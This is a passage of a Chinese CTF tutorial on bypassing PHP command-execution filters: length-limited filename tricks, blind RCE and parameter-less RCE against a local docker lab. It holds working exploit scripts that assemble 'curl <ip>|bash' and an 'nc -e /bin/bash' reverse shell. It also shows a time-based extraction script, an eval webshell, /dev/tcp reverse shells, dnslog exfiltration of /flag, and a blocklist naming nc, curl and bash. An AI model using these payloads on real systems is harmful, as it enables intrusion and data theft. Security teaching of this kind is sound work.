class="string">&quot;&gt;ls\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls&gt;_&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;-t\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\&gt;y&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls&gt;&gt;_&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据自己情况更改ip curl 192.168.40.146|bash</span></span><br><span class="line">list2=[</span><br><span class="line">    <span class="string">&quot;&gt;bash&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\|\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\/\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;6\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;14\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;0.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;4\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;8.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;16\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;2.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;19\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;rl\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;cu\\&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(i)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(j)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh _&quot;</span>)</span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">在攻击机上:</span></span><br><span class="line"><span class="string">开三个页面,分别执行:</span></span><br><span class="line"><span class="string">nc -lvp </span></span><br><span class="line"><span class="string">python -m http.server 80</span></span><br><span class="line"><span class="string">echo &quot;192.168.40.146&quot; &gt; index.html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">然后开始运行此python文件</span></span><br><span class="line"><span class="string">大概等21秒,成功反弹到攻击机</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="4字符下可控"><a href="#4字符下可控" class="headerlink" title="4字符下可控"></a>4字符下可控</h3><h4 id="法1-2"><a href="#法1-2" class="headerlink" title="法1"></a>法1</h4><p>常规：字符拼接写马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/\?|/&quot;</span>,<span class="string">&quot;=====&quot;</span>,<span class="variable">$argv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag in local path flag file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.输入统配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;id</span><br><span class="line">&gt;root</span><br><span class="line">*           （等同于命令：id root）</span><br></pre></td></tr></table></figure><p>2.dir:虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。</p><p>先看下ls的效果，写到a时每个文件名都是单独一行，这样会影响命令执行</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce58e6d.png" alt="image-20240401090301990"></p><p>看下dir的效果，会不换行输出到文件中去</p><p><img src="https://bu.dusays.com/2024/05/13/664161cda6859.png" alt="image-20240401090338004"></p><p>3.rev:可以反转文件每一行的内容。</p><p>4.增加字母来限定被用来当作命令和参数的文件名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;ls</span><br><span class="line">&gt;lss</span><br><span class="line">&gt;lsss</span><br><span class="line">&gt;1</span><br><span class="line">*s       (等同于命令： ls lss lsss)</span><br></pre></td></tr></table></figure><p>5.通过增加ls的-h（把文件大小显示成1k 1M 等形式）参数来让调整-t（根据时间排序）参数的位置<br>我们之后需要用到rev 倒置输出</p><p>所以需要列出这样形式的文件名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&gt;  t-  sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;0\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161cd8ee61.png" alt="image-20240401090117318"></p><p>所以要增加-h来把-t往前拉</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;0\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161cd95c36.png" alt="image-20240401090153203"></p><p>所以</p><p>因为是四个字符，所以 ls&gt;&gt;? 肯定是不能用了。</p><p>看一下构造：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br></pre></td></tr></table></figure><p>发现dir排在最前面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br></pre></td></tr></table></figure><p>*&gt;v 表示 执行 dir 并输出到 v 中</p><p>v&gt;x 很巧妙，这里这里目录下这么多文件，只有 rev 能执行成功（rev v&gt;x）</p><p>最后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v        (等同于命令：dir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0        (等同于命令：rev v &gt; 0)(0里面的内容位:ls -th &gt;f)</span><br><span class="line">sh 0        (sh执行0里面的内容)</span><br></pre></td></tr></table></figure><h4 id="法2-2"><a href="#法2-2" class="headerlink" title="法2"></a>法2</h4><p>反弹</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">可用</span></span><br><span class="line"><span class="string">本脚本使用说明:</span></span><br><span class="line"><span class="string">    现有靶机:192.168.40.148  攻击机:192.168.40.146,两者均为kali</span></span><br><span class="line"><span class="string">    对于靶机:</span></span><br><span class="line"><span class="string">        搭建环境:</span></span><br><span class="line"><span class="string">        拉取镜像: docker pull mcc0624/cmd:latest</span></span><br><span class="line"><span class="string">        启动docker: sudo docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085 -i -t mcc0624/cmd:latest bash -c &#x27;/etc/rc.local; /bin/bash&#x27;</span></span><br><span class="line"><span class="string">        退出并关闭docker:exit</span></span><br><span class="line"><span class="string">    对于攻击机: 开三个终端,分别执行:</span></span><br><span class="line"><span class="string">        nc -lvp 7777</span></span><br><span class="line"><span class="string">        vim 一个index.html文件,写入 nc 192.168.40.146 7777 -e /bin/bash 或执行命令: echo &quot;nc 192.168.40.146 7777 -e /bin/bash&quot; &gt; index.html</span></span><br><span class="line"><span class="string">        开启http服务: python -m http.server 80</span></span><br><span class="line"><span class="string">        (第二,第三个命令需要在同一个目录下执行)</span></span><br><span class="line"><span class="string">    温馨提示:</span></span><br><span class="line"><span class="string">        根据情况修改变量baseurl的值</span></span><br><span class="line"><span class="string">        根据情况修改list2中的IP</span></span><br><span class="line"><span class="string">        在执行该脚本的时候,可通过进入靶机内部对应的题目目录下不断地执行ls命令,来看传值的情况</span></span><br><span class="line"><span class="string">        最终的结果应是25秒左右能反弹成功</span></span><br><span class="line"><span class="string">        不能反弹成功时尝试查看脚本是否有问题,或退出并重启改docker</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">baseurl = <span class="string">&quot;http://192.168.40.148:18080/class09/4/ffff.php?cmd=&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ls -t 写入文件g</span></span><br><span class="line"><span class="built_in">list</span>=[</span><br><span class="line">    <span class="string">&quot;&gt;g\;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;g\&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;ht-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;sl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;dir&quot;</span>,</span><br><span class="line">    <span class="string">&quot;*&gt;v&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;rev&quot;</span>,</span><br><span class="line">    <span class="string">&quot;*v&gt;x&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># list2本质上执行命令: curl 192.168.40.146|bash</span></span><br><span class="line"><span class="comment"># 注意根据情况修改攻击机IP</span></span><br><span class="line">list2= [</span><br><span class="line">    <span class="string">&quot;&gt;ash&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;b\\&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\|\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;6\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;14\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;0.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;4\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;8.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;16\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;2.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;19\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;rl\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;cu\\&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(i)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(j)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh x&quot;</span>)</span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh g&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf4b5d1.png" alt="image-20240401090817745"></p><h3 id="3字符下可控"><a href="#3字符下可控" class="headerlink" title="3字符下可控"></a>3字符下可控</h3><p>CTFSHOW平台的【nl】难了 一题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只限3个字符的shell_exec，依然利用通配符 * 表示将ls下面的文件执行，如果第一个是命令就直接执行命令，后面的当参数，与前几点的原理类似</p><p>首先ls查看当前目录下有哪些文件  ?1&#x3D;ls</p><p>只存在s开头的和z开头的文件，Linux中文件排序按照26个英文字母顺序排放，所以我们依然利用前几种字符限制的方法，通过&gt;写入一个以命令名命名的文件，如:nl（读取文件带上行）od（八进制显示输出），但这样的命令前提是其第一个字母必须在当前文件名中排到第一位。</p><p>payload:<code>?1=&gt;nl ?1=*或?1=*&gt;z 第二种：?1=&gt;od ?1=*</code></p><p>接下来再传入?&#x3D;*的时候就会在源代码中得到flag。</p><h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>);</span><br><span class="line"><span class="comment">//$b=exec(&quot;$a&quot;);</span></span><br><span class="line"><span class="comment">//echo $b;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>命令执行函数我用的是<code>exec</code>,因为这个函数本身是没有回显的，拿来做测试简直不能再合适</p><h3 id="法1-3"><a href="#法1-3" class="headerlink" title="法1"></a>法1</h3><p>时间盲注</p><p>逻辑和SQL注入的时间盲注差不多</p><p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p><p>2.awk：逐行获取数据</p><p><code>cat test.php | awk NR==2               //awk NR==2 逐行获取一行字符</code></p><p>3.cut -c<br>cut命令逐列获取单个字符<br><code>cat flag | awk NR==2  | cut -c 1      #获取第一个字符 cat flag | awk NR==2  | cut -c 2      #获取第二个字符</code></p><p>4、if语句：判断命令是否执行<br>if [ $(cat flag | awk NR&#x3D;&#x3D;2 | cut -c 1) &#x3D;&#x3D; F ];then sleep 2;fi<br>if里的判断语句为真的话，则执行sleep 2，休眠2秒后返回结果 </p><p><img src="https://bu.dusays.com/2024/05/13/664161ce84d2d.png" alt="image-20240401093435071"></p><p>直接脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">可用</span></span><br><span class="line"><span class="string">环境搭建: 靶机:kali 192.168.40.148</span></span><br><span class="line"><span class="string">拉取镜像: docker pull mcc0624/cmd:latest</span></span><br><span class="line"><span class="string">启动docker: sudo docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085 -i -t mcc0624/cmd:latest bash -c &#x27;/etc/rc.local; /bin/bash&#x27;</span></span><br><span class="line"><span class="string">退出并关闭docker:exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># url=input(&quot;请输入URL:,例如:http://192.168.40.148:18080/class08/1.php?cmd=&quot;)</span></span><br><span class="line">url=<span class="built_in">input</span>(<span class="string">&quot;URL样式:http://192.168.40.148:18080/class08/1.php?cmd=\n请输入URL:&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">55</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">            k = <span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="comment"># time.sleep(0.1)</span></span><br><span class="line">            payload = <span class="string">f&quot;if [ `cat flag.php | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url + payload, timeout=(<span class="number">1.5</span>, <span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&quot;http://192.168.1.6:19080/class08/1.php&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>): //定义i、j、k三个变量</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):  </span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):  //<span class="built_in">ascii</span>码表</span><br><span class="line">            k=<span class="built_in">chr</span>(k)  //把<span class="built_in">ascii</span>码转换成字母，HEX编码变成字符</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)  //i定义读取<span class="number">1</span>-<span class="number">5</span>行，i定义读取<span class="number">1</span>-<span class="number">55</span>个字符</span><br><span class="line">            payload = <span class="string">&quot;?cmd=&quot;</span> + <span class="string">f&quot;if[ `ls | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>`==<span class="subst">&#123;k&#125;</span>];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k   //把值加入result，<span class="built_in">print</span>输出显示</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>两个脚本差不多</p><p><img src="https://bu.dusays.com/2024/05/13/664161d0d0b65.png" alt="image-20240401092849763"></p><h3 id="法2-3"><a href="#法2-3" class="headerlink" title="法2"></a>法2</h3><p>文件读写</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls | tee abc</span><br></pre></td></tr></table></figure><p><code>tee</code>命令用于从标准输入读取数据，并将其写入一个或多个文件 tee的作用是把查询到的根目录写入到当前网页下的某文件 再次访问该文件即可得到被打印的根目录</p><p><code>tee</code>通常后面会跟着要写入的文件名</p><p>先执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=ls| tee abc # 将ls的结果重定向到文件名为abc的文件中</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161ce6fe16.png" alt="image-20240401094832958"></p><p>还可以：</p><p>重定向符 :</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=echo &quot;&lt;?php show_source(__FILE__);@eval(\$_POST[&#x27;s&#x27;]); ?&gt;&quot; &gt; a.php</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161cfd7e0d.png" alt="image-20240401095308316"></p><p>再访问a.php</p><p><img src="https://bu.dusays.com/2024/05/13/664161cdd1ee9.png" alt="image-20240401095338301"></p><p>然后就随便打了</p><h3 id="法3-1"><a href="#法3-1" class="headerlink" title="法3"></a>法3</h3><p>反弹shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>);</span><br><span class="line"><span class="comment">//$b=exec(&quot;$a&quot;);</span></span><br><span class="line"><span class="comment">//echo $b;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>遇到这种无回显的命令执行，很常见的一个思路是反弹shell，因为它虽然不会将命令执行的结果输出在屏幕上，但实际上这个命令它是执行了的，那我们就将shell反弹到自己服务器上，然后再执行命令肯定就可以看到回显了</p><p>一般来讲我们反弹shell都用的<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>这条命令，但这里我不知道哪里出了问题，在docker中可以成功反弹但放到php命令执行中就反弹不了了，所以说无奈之下我就只能使用<code>nc</code>进行反弹，但其实这是很不实用的，因为很多docker中都没有安装<code>nc</code>，这里就先演示一下用<code>nc</code>反弹，利用<code>nc -e /bin/sh ip port</code>进行反弹：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce5cdba.png" alt="image-20240401211530764"></p><p><img src="https://bu.dusays.com/2024/05/13/664161d08ca11.png" alt="image-20240401211556638"></p><p>可以看到已经反弹成功了，拿到了根目录下的flag</p><h3 id="法4"><a href="#法4" class="headerlink" title="法4"></a>法4</h3><p>dnslog外带数据法</p><p><strong>DNS（域名解析）：</strong></p><blockquote><p>域名解析是把域名指向网站空间IP，让人们通过注册的域名可以方便地访问到网站的一种服务。IP地址是网络上标识站点的数字地址，为了方便记忆，采用域名来代替IP地址标识站点地址。域名解析就是域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。</p><p>域名解析也叫域名指向、服务器设置、域名配置以及反向IP登记等等。说得简单点就是将好记的域名解析成IP，服务由DNS服务器完成，是把域名解析到一个IP地址，然后在此IP地址的主机上将一个子目录与域名绑定。</p></blockquote><p>而如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析，那么假如我们有一个可控的二级域名，那么当它向下一层域名发起解析的时候，我们就能拿到它的域名解析请求。这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog。当然，发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令哈</p><blockquote><p>DNSLOG平台 </p><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a>  （是临时的网址）</p><p><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a> （不常用了）</p><p><a href="http://ceye.io/">http://ceye.io</a> （要注册）</p></blockquote><p>也可以使用yakit的DNSLog:</p><p><img src="https://bu.dusays.com/2024/05/13/664161cee4e55.png" alt="image-20240401212510959"></p><p>还是这一段代码，我们用分号<code>;</code>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令，具体如下：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce6c83e.png" alt="image-20240401212125289"></p><p>然后就可以到ceye平台上取看到我们发起的请求了，可以看到<code>whoami</code>的结果也已经在上面显示了出来：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cd6cf42.png" alt="image-20240401212157348"></p><p>然后我们就尝试执行其它的命令比如像<code>ls</code>之类的，但这里需要注意的一点是，如果我们直接执行<code>ls</code>的话，它只会返回第一条结果,具体如下图所示：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cdafb7e.png" alt="image-20240401212217281"></p><p>那么为了让它显示出剩余的结果，我们就需要用到linux的<code>sed</code>命令，用<code>sed</code>命令就可以实现对行的完美划分，这里利用题目不是很好演示，我就直接用kali进行演示，就像下图一样直接用就行，还是很方便的：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf9bdab.png" alt="image-20240401212241190"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=ping `ls|sed -n &#x27;1p&#x27;`.pmdbhelcqt.dgrh3.cn # 通过控制多少p,就可以看到ls出的第多少个文件名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=ping `cat /flag`.pmdbhelcqt.dgrh3.cn</span><br></pre></td></tr></table></figure><p>这样就可以完成任意的命令执行了，但是值得注意的是，因为有的字符可能会无法显示或者只显示部分信息，所以说执行命令的时候推荐使用base64编码，然后再解开就好：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce7b2e9.png" alt="image-20240401212313639"></p><p><img src="https://bu.dusays.com/2024/05/13/664161ce45caa.png" alt="image-20240401212332680"></p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果</p><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里的正则表达式 <code>[^\W]+\((?R)?\)</code> 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 